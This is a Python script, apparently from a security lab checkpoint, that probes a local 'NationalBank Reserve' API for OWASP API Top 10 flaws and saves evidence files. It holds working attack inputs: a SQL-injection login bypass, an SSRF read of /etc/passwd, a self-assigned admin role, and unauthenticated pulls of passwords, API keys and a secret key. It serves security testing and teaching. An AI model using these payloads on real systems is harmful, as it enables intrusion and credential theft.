#!/usr/bin/env python3
"""
NationalBank Reserve — Checkpoint 3
API Security Top 10 Tester
"""
import requests, json, sys

BASE = "http://localhost:5000"
EVIDENCE = "../02-evidence"

def log(m): print(f"[*] {m}")
def success(m): print(f"[+] {m}")
def fail(m): print(f"[-] {m}")
def divider(t): print("\n" + "="*60 + f"\n{t}\n" + "="*60)

def save(name, content):
    with open(f"{EVIDENCE}/{name}", "w") as f:
        json.dump(content, f, indent=2)

# ============================================================
# API1: BOLA - Broken Object Level Authorization
# ============================================================
def test_bola():
    divider("API1: BOLA - Broken Object Level Authorization")
    log("Accessing /api/v1/user/1 (admin) and /api/v1/user/3 (bob) WITHOUT auth")
    r1 = requests.get(f"{BASE}/api/v1/user/1")
    r3 = requests.get(f"{BASE}/api/v1/user/3")
    save("API1-BOLA-user1.json", r1.json())
    save("API1-BOLA-user3.json", r3.json())
    log(f"User 1: {r1.json()}")
    log(f"User 3: {r3.json()}")
    if r1.status_code == 200 and r3.status_code == 200:
        success("BOLA CONFIRMED! No authorization check between users")
        return True
    return False

# ============================================================
# API2: Broken Authentication
# ============================================================
def test_broken_auth():
    divider("API2: Broken Authentication")
    log("Accessing /api/v1/admin WITHOUT any token")
    r = requests.get(f"{BASE}/api/v1/admin")
    save("API2-broken-auth.json", r.json())
    log(f"Response: {r.json()}")
    if r.status_code == 200 and "admin" in str(r.json()).lower():
        success("Broken Authentication CONFIRMED! Admin endpoint accessible without auth")
        return True
    return False

# ============================================================
# API3: Excessive Data Exposure
# ============================================================
def test_data_exposure():
    divider("API3: Excessive Data Exposure")
    log("Checking /api/v1/users for sensitive fields")
    r = requests.get(f"{BASE}/api/v1/users")
    save("API3-data-exposure.json", r.json())
    data = r.json()
    has_password = any("password" in u for u in data)
    has_apikey = any("api_key" in u for u in data)
    log(f"Passwords exposed: {has_password}")
    log(f"API keys exposed: {has_apikey}")
    if has_password and has_apikey:
        success("Excessive Data Exposure CONFIRMED! Passwords + API keys leaked")
        return True
    return False

# ============================================================
# API5: Broken Function Level Authorization
# ============================================================
def test_bfla():
    divider("API5: Broken Function Level Authorization")
    log("Trying to register user with role=admin (Mass Assignment)")
    payload = {"username": "attacker", "password": "pwned", "role": "admin"}
    r = requests.post(f"{BASE}/api/v1/register", json=payload)
    save("API5-BFLA-mass-assignment.json", r.json())
    log(f"Response: {r.json()}")
    if r.status_code == 200 and r.json().get("role") == "admin":
        success("Mass Assignment CONFIRMED! Attacker can self-assign admin role")
        return True
    return False

# ============================================================
# API7: SSRF
# ============================================================
def test_ssrf():
    divider("API7: SSRF - Server-Side Request Forgery")
    log("Testing SSRF: fetch internal file")
    r = requests.get(f"{BASE}/api/v1/fetch", params={"url": "file:///etc/passwd"})
    save("API7-SSRF-passwd.json", r.json())
    log(f"Response snippet: {str(r.json())[:200]}")
    if r.status_code == 200 and "root:" in str(r.json()):
        success("SSRF CONFIRMED! Can read local files via /api/v1/fetch")
        return True
    return False

# ============================================================
# API8: SQL Injection via login
# ============================================================
def test_api_sqli():
    divider("API8: SQL Injection via API")
    log("Testing SQLi: username=admin' OR '1'='1'--")
    payload = {"username": "admin' OR '1'='1'--", "password": "anything"}
    r = requests.post(f"{BASE}/api/v1/login", json=payload)
    save("API8-SQLi-login.json", r.json())
    log(f"Response: {r.json()}")
    if r.status_code == 200 and "token" in r.json():
        success("API SQL Injection CONFIRMED! Bypassed login via SQLi")
        return True
    return False

# ============================================================
# API9: Improper Assets Management
# ============================================================
def test_improper_assets():
    divider("API9: Improper Assets Management")
    log("Checking /api/v1/debug for sensitive data")
    r = requests.get(f"{BASE}/api/v1/debug")
    save("API9-debug-endpoint.json", r.json())
    log(f"Response: {r.json()}")
    if r.status_code == 200 and "secret_key" in r.json():
        success("Improper Assets Management CONFIRMED! Debug endpoint leaks secret_key")
        return True
    return False

# ============================================================
# MAIN
# ============================================================
def main():
    print("="*60)
    print("NationalBank Reserve — API Security Top 10 Tester")
    print("="*60)

    results = {
        "API1-BOLA": test_bola(),
        "API2-BrokenAuth": test_broken_auth(),
        "API3-DataExposure": test_data_exposure(),
        "API5-BFLA-MassAssignment": test_bfla(),
        "API7-SSRF": test_ssrf(),
        "API8-SQLi": test_api_sqli(),
        "API9-ImproperAssets": test_improper_assets(),
    }

    print("\n" + "="*60)
    print("API SECURITY SUMMARY")
    print("="*60)
    for test, result in results.items():
        status = "[+] VULNERABLE" if result else "[-] Not vulnerable"
        print(f"  {status}: {test}")

    vuln = sum(results.values())
    print(f"\nTotal API vulnerabilities: {vuln}/{len(results)}")
    print("="*60)

if __name__ == "__main__":
    main()
